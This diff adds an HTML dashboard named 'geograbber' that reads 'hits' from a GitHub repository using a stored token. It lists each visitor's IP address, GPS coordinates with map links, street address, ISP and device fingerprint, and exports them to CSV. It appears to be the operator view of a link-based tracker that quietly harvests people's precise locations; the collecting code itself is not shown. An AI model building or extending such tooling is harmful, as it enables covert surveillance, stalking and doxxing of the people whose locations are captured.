@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>geograbber</title>
+<style>
+  :root{color-scheme:dark}
+  body{margin:0;padding:22px;background:#0b0d10;color:#e7e9ee;font:14px/1.45 system-ui,sans-serif}
+  h1{font-size:16px;margin:0 0 12px}
+  a{color:#7dd3fc;text-decoration:none}
+  .bar{display:flex;gap:8px;align-items:center;margin-bottom:14px;flex-wrap:wrap}
+  button{padding:8px 12px;border-radius:8px;border:1px solid #2a303b;background:#161b22;color:#e7e9ee;cursor:pointer}
+  table{width:100%;border-collapse:collapse;font-size:12.5px}
+  th,td{text-align:left;padding:8px 9px;border-bottom:1px solid #171c24;vertical-align:top}
+  th{color:#8b93a3;font-weight:500;font-size:11px;text-transform:uppercase}
+  .mono{font-family:ui-monospace,Menlo,monospace;font-size:12px}
+  .dim{color:#77808f}
+  .pill{display:inline-block;padding:1px 7px;border-radius:99px;font-size:11px;background:#132a1c;color:#4ade80}
+  .pill.no{background:#2a1a12;color:#fb923c}
+</style></head><body>
+<h1>geograbber</h1>
+<div class="bar">
+  <button id="load">Refresh</button>
+  <button id="csv">CSV</button>
+  <span class="dim" id="status">—</span>
+</div>
+<div id="wrap"></div>
+<script>
+const REPO = 'makolryan26-cyber/smileys-geo';
+let TOKEN = localStorage.getItem('gh_token') || '';
+if (!TOKEN) { TOKEN = prompt('GitHub token (repo contents read)') || ''; localStorage.setItem('gh_token', TOKEN); }
+const H = { Authorization: 'Bearer ' + TOKEN, Accept: 'application/vnd.github+json' };
+let rows = [];
+
+const esc = s => String(s == null ? '' : s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+
+async function load() {
+  document.getElementById('status').textContent = 'loading…';
+  const r = await fetch(`https://api.github.com/repos/${REPO}/contents/hits?ref=main`, { headers: H });
+  if (!r.ok) { document.getElementById('status').textContent = 'error ' + r.status; return; }
+  const files = (await r.json()).filter(f => f.name.endsWith('.json')).reverse();
+  document.getElementById('status').textContent = files.length + ' hits';
+  const out = [];
+  for (const f of files.slice(0, 200)) {
+    try {
+      const c = await (await fetch(f.download_url, { cache: 'no-store' })).json();
+      out.push(c);
+    } catch (e) {}
+  }
+  rows = out;
+  render();
+}
+
+function render() {
+  const wrap = document.getElementById('wrap');
+  if (!rows.length) { wrap.innerHTML = '<p class="dim">No hits yet.</p>'; return; }
+  wrap.innerHTML = '<table><thead><tr><th>time</th><th>ip</th><th>gps</th><th>address</th><th>ip geo</th><th>device</th></tr></thead><tbody>' +
+    rows.map(x => {
+      const g = x.ipgeo || {};
+      const gp = x.gps && x.gps.lat
+        ? `<a href="https://maps.google.com/?q=${esc(x.gps.lat)},${esc(x.gps.lon)}" target="_blank">${esc(x.gps.lat)}, ${esc(x.gps.lon)}</a><br><span class="pill">±${esc(x.gps.acc)}m</span>`
+        : '<span class="pill no">ip only</span>';
+      return `<tr><td class="mono dim">${esc((x.ts || '').slice(0, 19))}</td>
+        <td class="mono">${esc(g.ip)}</td><td class="mono">${gp}</td>
+        <td>${esc(x.addr || '—')}</td>
+        <td>${esc([g.city, g.region, g.postal].filter(Boolean).join(', '))}<br><span class="dim">${esc(g.connection && (g.connection.isp + ' / ' + g.connection.asn))}</span></td>
+        <td class="dim">${esc(x.meta && x.meta.screen)} · ${esc(x.meta && x.meta.platform)} · ${esc(x.meta && x.meta.lang)}<br><span class="mono">${esc((x.meta && x.meta.ua || '').slice(0, 90))}</span></td></tr>`;
+    }).join('') + '</tbody></table>';
+}
+
+document.getElementById('load').onclick = load;
+document.getElementById('csv').onclick = () => {
+  const cols = ['ts','ip','lat','lon','acc','addr','city','region','postal','country','isp','tz','screen','lang','ua','ref'];
+  const cell = x => [x.ts, (x.ipgeo||{}).ip, (x.gps||{}).lat, (x.gps||{}).lon, (x.gps||{}).acc,
+    x.addr, (x.ipgeo||{}).city, (x.ipgeo||{}).region, (x.ipgeo||{}).postal, (x.ipgeo||{}).country,
+    ((x.ipgeo||{}).connection||{}).isp, (x.meta||{}).tz, (x.meta||{}).screen, (x.meta||{}).lang,
+    (x.meta||{}).ua, (x.meta||{}).ref]
+    .map(v => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"').join(',');
+  const blob = new Blob([[cols.join(','), ...rows.map(cell)].join('\n')], { type: 'text/csv' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'hits.csv'; a.click();
+};
+load();
+</script>
+</body></html>
